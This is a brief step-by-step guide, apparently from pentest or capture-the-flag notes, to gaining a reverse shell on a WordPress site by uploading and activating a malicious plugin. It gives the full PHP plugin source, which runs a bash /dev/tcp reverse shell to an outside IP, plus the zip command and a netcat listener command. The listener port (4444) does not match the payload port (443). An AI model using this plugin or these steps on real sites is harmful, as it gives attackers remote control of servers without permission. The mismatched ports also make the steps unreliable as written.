1) Create the revsh-plugin.php and change the ip and port accordingly
```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.86.99/443 0>&1'");
?>
```
2) zip the revsh-plugin.php in kali `zip revsh-plugin.zip revsh-plugin.php`
3) Go to the WPPortal and login to upload the plugin
4) Start listener at Kali `nc -nvlp 4444`
5) Click 'Activate' Button to start the reverse shell.

More info at: https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
